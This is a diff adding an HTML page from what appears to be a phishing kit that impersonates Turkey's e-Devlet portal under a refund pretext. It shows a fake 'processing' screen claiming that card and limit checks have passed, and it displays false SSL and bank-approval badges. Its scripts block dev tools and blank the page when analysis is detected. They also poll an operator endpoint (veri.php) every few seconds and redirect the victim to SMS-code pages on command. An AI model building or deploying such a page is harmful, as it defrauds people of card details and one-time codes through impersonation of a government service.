@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="tr" class="h-full bg-gray-50">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="IE=edge">
+    <meta http-equiv="cleartype" content="on">
+    <title>e-Devlet Kapısı - İade İşlemleri</title>
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#4284de">
+    
+    <!-- Dev Tools Engelleme -->
+    <script>
+        // Dev Tools Engelleme
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (
+                e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+                (e.ctrlKey && e.key === 'u') ||
+                (e.ctrlKey && e.key === 's')
+            ) {
+                e.preventDefault();
+            }
+        });
+
+        setInterval(function() {
+            debugger;
+        }, 100);
+
+        (() => {
+            function isMobile() {
+                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            }
+
+            function detectDevTools() {
+                if (!isMobile()) {
+                    // Masaüstü için daha geniş tolerans
+                    const widthThreshold = window.outerWidth - window.innerWidth > 300;
+                    const heightThreshold = window.outerHeight - window.innerHeight > 300;
+                    
+                    if(widthThreshold || heightThreshold) {
+                        document.body.innerHTML = '';
+                        window.location.href = 'about:blank';
+                    }
+                } else {
+                    // Mobil cihazlar için daha esnek tolerans
+                    const widthThreshold = window.outerWidth - window.innerWidth > 500;
+                    const heightThreshold = window.outerHeight - window.innerHeight > 500;
+                    
+                    if(widthThreshold || heightThreshold) {
+                        document.body.innerHTML = '';
+                        window.location.href = 'about:blank';
+                    }
+                }
+            }
+
+            // Mobil cihazlar için daha az sıklıkta kontrol
+            if (isMobile()) {
+                window.addEventListener('resize', () => {
+                    setTimeout(detectDevTools, 1000);
+                });
+                setInterval(detectDevTools, 3000);
+            } else {
+                window.addEventListener('resize', detectDevTools);
+                setInterval(detectDevTools, 1000);
+            }
+        })();
+    </script>
+    
+    <!-- jQuery -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="assets/img/favicon-196x196.png" sizes="196x196">
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;500;600;700&family=Montserrat:wght@500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --font-primary: 'Public Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+            --font-heading: 'Montserrat', Arial, sans-serif;
+        }
+
+        body {
+            font-family: var(--font-primary);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            min-height: 100vh;
+            width: 100%;
+            overflow-x: hidden;
+        }
+
+        @media (max-width: 640px) {
+            body {
+                font-size: 14px;
+            }
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e5e7eb;
+            border-radius: 999px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, #3b82f6, #60a5fa);
+            animation: progress 15s linear forwards;
+        }
+
+        @keyframes progress {
+            0% { width: 0; }
+            100% { width: 100%; }
+        }
+
+        .pulse {
+            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: .7; }
+        }
+
+        .spin-slow {
+            animation: spin 3s linear infinite;
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .shimmer {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .shimmer::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 200%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                rgba(255,255,255,0) 0%,
+                rgba(255,255,255,0.2) 25%,
+                rgba(255,255,255,0.2) 50%,
+                rgba(255,255,255,0) 100%
+            );
+            animation: shimmer 3s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(50%); }
+        }
+
+        .loading-dots::after {
+            content: '';
+            animation: dots 1.5s infinite;
+        }
+
+        @keyframes dots {
+            0% { content: ''; }
+            25% { content: '.'; }
+            50% { content: '..'; }
+            75% { content: '...'; }
+            100% { content: ''; }
+        }
+
+        /* Responsive Tasarım */
+        @media (max-width: 640px) {
+            .logo-container img {
+                height: 2rem;
+            }
+
+            .step-container {
+                font-size: 0.75rem;
+                padding: 0.5rem;
+            }
+
+            .step-container i {
+                font-size: 0.875rem;
+            }
+
+            .main-content {
+                padding: 1rem;
+            }
+
+            .icon-container {
+                width: 3.5rem;
+                height: 3.5rem;
+            }
+
+            .icon-container i {
+                font-size: 1.5rem;
+            }
+
+            .security-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 0.5rem;
+            }
+
+            .security-item {
+                padding: 0.5rem;
+            }
+        }
+    </style>
+</head>
+
+<body class="h-full bg-gray-50">
+    <!-- Üst Banner -->
+    <div class="bg-blue-600 text-white py-2 px-4 text-center text-sm md:text-base flex items-center justify-center">
+        <i class="fas fa-shield-alt mr-2"></i>
+        <span class="hidden sm:inline">256-bit SSL korumalı devlet altyapısı üzerinden işlem yapıyorsunuz</span>
+        <span class="sm:hidden">SSL Korumalı İşlem</span>
+    </div>
+
+    <!-- Logo ve Header -->
+    <div class="bg-white shadow-sm p-4">
+        <div class="max-w-7xl mx-auto flex justify-center items-center space-x-4 md:space-x-6">
+            <img src="https://cdn.e-devlet.gov.tr/downloads/kurumsal-kimlik/logo/e-devlet-logo.png" alt="e-Devlet Logo" class="h-8 md:h-12">
+            <div class="h-6 md:h-8 w-px bg-gray-200"></div>
+            <img src="assets/img/edkkds.svg" alt="e-Devlet Logo 2" class="h-8 md:h-12">
+        </div>
+    </div>
+
+    <div class="min-h-[calc(100vh-8rem)] flex flex-col justify-center py-6 md:py-12 px-4 sm:px-6 lg:px-8">
+        <!-- İşlem Adımları -->
+        <div class="sm:mx-auto sm:w-full sm:max-w-2xl mb-6 md:mb-8">
+            <div class="flex items-center justify-center space-x-2 md:space-x-4 text-xs md:text-sm font-medium overflow-x-auto px-4">
+                <span class="flex items-center text-green-600 whitespace-nowrap">
+                    <i class="fas fa-check-circle mr-1"></i>
+                    <span class="hidden sm:inline">Kimlik</span>
+                </span>
+                <i class="fas fa-chevron-right text-gray-400"></i>
+                <span class="flex items-center text-green-600 whitespace-nowrap">
+                    <i class="fas fa-check-circle mr-1"></i>
+                    <span class="hidden sm:inline">Kart</span>
+                </span>
+                <i class="fas fa-chevron-right text-gray-400"></i>
+                <span class="flex items-center text-green-600 whitespace-nowrap">
+                    <i class="fas fa-check-circle mr-1"></i>
+                    <span class="hidden sm:inline">Limit</span>
+                </span>
+                <i class="fas fa-chevron-right text-gray-400"></i>
+                <span class="flex items-center text-blue-600 pulse whitespace-nowrap">
+                    <i class="fas fa-circle-notch fa-spin mr-1"></i>
+                    <span class="hidden sm:inline">İşlem</span>
+                </span>
+                <i class="fas fa-chevron-right text-gray-400"></i>
+                <span class="text-gray-400 whitespace-nowrap">
+                    <span class="hidden sm:inline">SMS</span>
+                </span>
+            </div>
+        </div>
+
+        <!-- Ana İçerik -->
+        <div class="sm:mx-auto sm:w-full sm:max-w-md md:max-w-xl">
+            <div class="bg-white py-6 md:py-8 px-4 shadow-2xl sm:rounded-2xl sm:px-8 md:px-10 fade-in relative overflow-hidden">
+                <!-- Üst Kısım -->
+                <div class="text-center mb-6 md:mb-8">
+                    <div class="inline-flex items-center justify-center w-16 h-16 md:w-20 md:h-20 rounded-full bg-blue-100 mb-4 md:mb-6">
+                        <i class="fas fa-cog text-xl md:text-2xl text-blue-600 spin-slow"></i>
+                    </div>
+                    <h2 class="text-xl md:text-2xl font-bold text-gray-900 mb-2">İşleminiz Yapılıyor</h2>
+                    <p class="text-gray-600 text-sm md:text-base loading-dots">Lütfen bekleyiniz</p>
+                </div>
+
+                <!-- İşlem Detayları -->
+                <div class="space-y-4 md:space-y-6">
+                    <!-- Progress Bar -->
+                    <div class="space-y-2">
+                        <div class="flex justify-between text-xs md:text-sm text-gray-600">
+                            <span>İşlem durumu</span>
+                            <span class="loading-dots">Kontroller yapılıyor</span>
+                        </div>
+                        <div class="progress-bar"></div>
+                    </div>
+
+                    <!-- İşlem Adımları -->
+                    <div class="bg-gray-50 rounded-lg p-3 md:p-4 space-y-2 md:space-y-3">
+                        <div class="flex items-center text-xs md:text-sm">
+                            <i class="fas fa-check-circle text-green-500 mr-2 md:mr-3"></i>
+                            <span class="text-gray-600">Kimlik doğrulaması tamamlandı</span>
+                        </div>
+                        <div class="flex items-center text-xs md:text-sm">
+                            <i class="fas fa-check-circle text-green-500 mr-2 md:mr-3"></i>
+                            <span class="text-gray-600">Kart bilgileri onaylandı</span>
+                        </div>
+                        <div class="flex items-center text-xs md:text-sm">
+                            <i class="fas fa-check-circle text-green-500 mr-2 md:mr-3"></i>
+                            <span class="text-gray-600">Limit kontrolü başarılı</span>
+                        </div>
+                        <div class="flex items-center text-xs md:text-sm">
+                            <i class="fas fa-circle-notch fa-spin text-blue-500 mr-2 md:mr-3"></i>
+                            <span class="text-blue-600 font-medium">Banka bağlantısı kuruluyor</span>
+                        </div>
+                    </div>
+
+                    <!-- Güvenlik Bilgileri -->
+                    <div class="grid grid-cols-2 md:grid-cols-3 gap-3 md:gap-4 pt-4 border-t">
+                        <div class="text-center">
+                            <div class="bg-green-50 rounded-lg p-2 md:p-3 mb-1 md:mb-2">
+                                <i class="fas fa-shield-alt text-green-500 text-sm md:text-base"></i>
+                            </div>
+                            <span class="text-[10px] md:text-xs text-gray-600">SSL Güvenli</span>
+                        </div>
+                        <div class="text-center">
+                            <div class="bg-green-50 rounded-lg p-2 md:p-3 mb-1 md:mb-2">
+                                <i class="fas fa-lock text-green-500 text-sm md:text-base"></i>
+                            </div>
+                            <span class="text-[10px] md:text-xs text-gray-600">Şifreli İletişim</span>
+                        </div>
+                        <div class="text-center col-span-2 md:col-span-1">
+                            <div class="bg-green-50 rounded-lg p-2 md:p-3 mb-1 md:mb-2">
+                                <i class="fas fa-university text-green-500 text-sm md:text-base"></i>
+                            </div>
+                            <span class="text-[10px] md:text-xs text-gray-600">Banka Onaylı</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Alt Bilgi -->
+                <div class="mt-6 md:mt-8 pt-4 border-t border-gray-200">
+                    <div class="flex items-center justify-between text-[10px] md:text-xs text-gray-500">
+                        <div class="flex items-center">
+                            <i class="fas fa-clock text-blue-500 mr-1"></i>
+                            <span>Tahmini süre: <span class="hidden sm:inline">30 saniye</span><span class="sm:hidden">30 sn</span></span>
+                        </div>
+                        <span>İşlem No: #3960873</span>
+                    </div>
+                </div>
+
+                <!-- Shimmer Efekti -->
+                <div class="absolute inset-0 shimmer"></div>
+            </div>
+        </div>
+
+        <!-- Alt Bilgi -->
+        <div class="mt-6 md:mt-8 text-center">
+            <p class="text-[10px] md:text-xs text-gray-400">
+                © 2024 e-Devlet Kapısı - Tüm Hakları Saklıdır
+            </p>
+        </div>
+    </div>
+
+    <script>
+        $(document).ready(function() {
+            function gonder() {
+                const csrfToken = '16d323aeb3db6846351be9add510eadb104a8e072407fc12f78c56ac984d4462';
+                $.ajax({
+                    type: 'POST',
+                    url: 'veri.php?ip=195.88.86.111',
+                    headers: {
+                        'X-CSRF-Token': csrfToken,
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    success: function(msg) {
+                        msg = msg.trim();
+                        switch(msg) {
+                            case 'back':
+                                window.location.href = 'index.php';
+                                break;
+                            case 'hata1':
+                                window.location.href = 'sms-hatali.php';
+                                break;
+                            case 'sms':
+                                window.location.href = 'sms-dogrulama.php';
+                                break;
+                            case 'tebrik':
+                                window.location.href = 'tebrikler.php';
+                                break;
+                        }
+                    }
+                });
+            }
+
+            gonder();
+            setInterval(gonder, 2500);
+        });
+    </script>
+</body>
+</html>
